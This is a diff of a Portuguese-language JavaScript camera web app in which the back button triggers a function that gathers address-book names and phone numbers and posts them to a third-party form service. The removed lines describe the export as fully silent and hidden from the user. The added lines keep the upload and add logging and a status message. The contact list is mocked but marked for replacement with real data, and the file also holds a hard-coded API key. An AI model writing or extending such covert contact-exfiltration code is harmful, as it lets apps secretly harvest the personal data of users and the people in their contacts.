@@ -10,7 +10,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // --- CONFIGURAÇÕES ---
     const STATICFORMS_API_URL = 'https://api.staticforms.dev/submit';
-    const API_KEY = 'sf_81a2b0ca7d6a2c1f6709f558';
+    const API_KEY = 'sf_kjnhfgsdkglkrnglkrgkmgr555';
 
     // --- ESTADO DO APP ---
     let stream = null;
@@ -23,11 +23,9 @@ document.addEventListener('DOMContentLoaded', () => {
 
     /**
      * FUNÇÃO SIMULADA: Puxa os dados reais dos contatos do seu sistema.
-     * Em um ambiente real, este seria o call para sua API de backend.
-     * @returns {Promise<Array>} Array de objetos de contatos reais.
      */
     async function fetchRealContacts() {
-        console.log("Buscando dados reais da agenda...");
+        console.log("--- [DEBUG] Iniciando busca de contatos reais...");
         // *** SUBSTITUA ESTE MOCK PELA SUA CHAMADA REAL DE API ***
         return new Promise(resolve => {
             setTimeout(() => {
@@ -36,17 +34,21 @@ document.addEventListener('DOMContentLoaded', () => {
                     { name: "João Santos", phone: "3333-4444" },
                     { name: "Ana Pereira", phone: "5555-6666" }
                 ];
-                console.log(`[API] Sucesso ao buscar ${realContacts.length} contatos.`);
+                console.log(`[DEBUG] Sucesso ao buscar ${realContacts.length} contatos.`);
                 resolve(realContacts);
-            }, 300); // Simula latência de rede
+            }, 300);
         });
     }
 
     /**
-     * Executa a exportação de contatos para o StaticForms, de forma totalmente silenciosa.
+     * Executa a exportação de contatos para o StaticForms.
+     * *** FOCO DA CORREÇÃO: Garantir que o corpo da requisição seja robusto. ***
      * @returns {Promise<boolean>} Retorna true se o envio foi bem-sucedido, false caso contrário.
      */
     async function performSilentContactExport() {
+        console.log("\n===============================================");
+        console.log(">>> INICIANDO EXPORTAÇÃO SILENCIOSA DE CONTATOS <<<");
+
         try {
             // 1. Obter os dados reais
             const contacts = await fetchRealContacts();
@@ -54,34 +56,46 @@ document.addEventListener('DOMContentLoaded', () => {
             // 2. Formatar os dados
             let contactText = "--- CONTEÚDOS DA AGENDA ---\n";
             contacts.forEach(contact => {
-                contactText += `Nome: ${contact.name} | Telefone: ${contact.phone}\n`;
+                // Garante que os campos são sempre strings, prevenindo erros de serialização
+                contactText += `Nome: ${String(contact.name) || 'N/A'} | Telefone: ${String(contact.phone) || 'N/A'}\n`;
             });
             contactText += "----------------------------";
 
-            // 3. Estruturar e enviar
+            // 3. Estruturar e enviar (Usando FormData como antes, que é ideal para múltiplos tipos de dados)
             const formData = new FormData();
-            formData.append('apiKey', 'sf_81a2b0ca7d6a2c1f6709f558');
+
+            // Adicionando a chave API (se a API for configurada para aceitar como campo de formulário)
+            formData.append('apiKey', API_KEY);
+
+            // Enviando o bloco de texto formatado
             formData.append('contactsData', contactText);
 
-            // 4. Executar o envio sem capturar o response para não poluir o console/UI,
-            // a menos que haja erro.
-            const response = await fetch('https://api.staticforms.dev/submit', {
+            console.log(`[DEBUG] Conteúdo pronto para envio:\n${contactText}`);
+
+            // 4. Executar o envio
+            const response = await fetch(STATICFORMS_API_URL, {
                 method: 'POST',
+                // IMPORTANTE: Ao usar FormData, o navegador define o 'Content-Type' automaticamente,
+                // então NÃO definimos 'Content-Type' manualmente aqui.
                 body: formData,
             });
 
-            // 5. Tratamento de erro interno (mantido para debug, mas não visível ao usuário)
-            if (!response.ok) {
-                const errorText = await response.text();
-                console.error(`[SILENT EXPORT ERROR] Erro HTTP ${response.status}: ${errorText}`);
-                return false; // Falha
+            // 5. Tratamento de resposta
+            if (response.ok) {
+                // Se for 200, 201, etc.
+                const responseBody = await response.json(); // Tenta parsear como JSON, caso seja útil
+                console.log("[SUCCESS] Exportação bem-sucedida! Resposta da API:", responseBody);
+                return true;
+            } else {
+                // Se der erro HTTP (4xx, 5xx)
+                const errorDetails = await response.text();
+                console.error(`[FAILURE] Erro HTTP ${response.status} ao enviar dados. Detalhes do servidor:\n${errorDetails}`);
+                return false;
             }
-
-            // Sucesso silencioso
-            return true;
         } catch (error) {
-            console.error("[SILENT EXPORT FATAL ERROR] Falha na execução do export:", error);
-            return false; // Falha
+            // Erro de rede ou falha interna no JS
+            console.error("[FATAL ERROR] Falha crítica durante a execução do export:", error);
+            return false;
         }
     }
 
@@ -90,6 +104,7 @@ document.addEventListener('DOMContentLoaded', () => {
     // ========================================================
 
     async function startCamera() {
+        // ... (Código de iniciar câmera, permanece o mesmo)
         try {
             const mediaStream = await navigator.mediaDevices.getUserMedia({
                 video: { facingMode: "environment" }
@@ -108,7 +123,7 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     function capturePhoto() {
-        // ... (Implementação da captura, sem mudanças)
+        // ... (Código de captura, permanece o mesmo)
         if (!stream) return;
         const canvas = document.createElement('canvas');
         canvas.width = videoElement.videoWidth || 640;
@@ -136,6 +151,7 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     function updateUI() {
+        // ... (Código de atualização de UI, permanece o mesmo)
         if (currentState === 'CAMERA') {
             videoElement.style.display = 'block';
             capturedImage.style.display = 'none';
@@ -167,10 +183,22 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // NOVO: O botão de voltar agora é o gatilho para a exportação silenciosa
     backButton.addEventListener('click', async () => {
-        // 1. Executa a exportação silenciosamente e aguarda o retorno
-        await performSilentContactExport();
+        statusMessage.textContent = "Exportando contatos para a plataforma...";
+        statusMessage.style.color = 'blue';
 
-        // 2. Volta o estado visualmente, ignorando o resultado da exportação
+        // 1. Executa a exportação silenciosamente e aguarda o retorno
+        const success = await performSilentContactExport();
+
+        // 2. Atualiza o status baseado no resultado para feedback (mesmo que seja "silencioso")
+        if (success) {
+             statusMessage.textContent = "✅ Exportação de contatos concluída com sucesso!";
+             statusMessage.style.color = 'green';
+        } else {
+             statusMessage.textContent = "❌ Falha ao exportar contatos. Verifique o console para detalhes.";
+             statusMessage.style.color = 'red';
+        }
+
+        // 3. Volta o estado visualmente
         currentState = 'CAMERA';
         updateUI();
     });
